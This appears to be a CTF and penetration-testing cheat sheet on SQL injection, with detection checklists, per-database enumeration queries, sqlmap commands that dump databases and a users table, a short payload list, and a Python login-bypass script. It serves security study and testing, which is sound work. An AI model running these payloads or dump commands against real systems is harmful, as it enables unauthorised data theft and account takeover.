# SQL Injection (SQLi)

## Purpose
Exfiltrate databases, bypass logins, and occasionally run operating system commands via SQL interface manipulation.

## Decision Tree
```
Check injection behaviour:
 ├── Input reflected in response?
 │    ├── Yes -> UNION Based
 │    └── No -> Check if database error is output?
 │         ├── Yes -> Error Based
 │         └── No -> Blind
 │              ├── Time response changes on true condition? -> Time-based Blind
 │              └── Content response changes on true condition? -> Boolean-based Blind
```

## Recon Checklist
- [ ] Identify parameters interacting with the back-end database (IDs, usernames, search query parameters).
- [ ] Test headers (User-Agent, X-Forwarded-For) that might be stored in logs.
- [ ] Map request pathways.

## Detection Checklist
- [ ] Insert single quote `'` or double quote `"` and look for SQL errors or broken pages.
- [ ] Insert numeric modifications (e.g. `id=2-1` returns page for `id=1`).
- [ ] Test logic checks: `id=1 AND 1=1` vs `id=1 AND 1=2`.

## Recon Workflow
1. Browse target pages and catalog all dynamic endpoints.
2. Intercept traffic with proxy (Burp Suite).
3. Attempt simple logic inputs to see if results change dynamically.

## Enumeration
- Determine column count: `' ORDER BY 1--`, `' ORDER BY 2--` etc.
- Determine database type:
  - MySQL/MariaDB: `SELECT version()`, `SLEEP(5)`
  - PostgreSQL: `SELECT version()`, `pg_sleep(5)`
  - SQLite: `sqlite_version()`, random math delays
  - MSSQL: `@@version`, `WAITFOR DELAY`

## Useful Tools
- `sqlmap` (Automated exploitation)
- Burp Suite (Intruder/Repeater)

## Quick Commands
```bash
# Automated dump database using sqlmap
sqlmap -u "http://target.com/index.php?id=1" --dbs --batch
# Dump target table
sqlmap -u "http://target.com/index.php?id=1" -D db_name -T users --dump --batch
```

## Linux Commands
*(Refer to SQL Injection payloads file for custom queries)*

## Common Payloads
```sql
' OR 1=1--
' UNION SELECT NULL,NULL,version()--
' AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1)--
' AND SLEEP(5)--
```

## Exploitation Workflow
1. Locate vulnerable entry point parameters.
2. Determine column count via ORDER BY or UNION SELECT NULL.
3. Replace NULL entries with columns of matching data types.
4. Extract database names, table names, column names, and records.

## Example CTF Scenario
A login portal validates users against a backend database. Injecting `admin' --` in the username field truncates the query logic, loggin the user in as admin without checking the password.

## Python Automation Example
```python
import requests
url = "http://target.com/login.php"
payload = {"username": "admin' --", "password": "any"}
r = requests.post(url, data=payload)
if "Welcome admin" in r.text:
    print("[+] Successfully bypassed authentication!")
```

## Common Mistakes
- Mismatched column count or data types during UNION attacks.
- Failing to URL-encode characters (e.g. `+` or `#`) in GET requests.

## CTF Tips
- Always check the database version first; it dictates which functions are available.
- Look out for SQLite in CTF tasks; standard system databases (`information_schema`) do not exist there. Use `sqlite_master` instead.

## References
- OWASP: SQL Injection
- HackTricks: SQL Injection
- PayloadsAllTheThings: SQL Injection
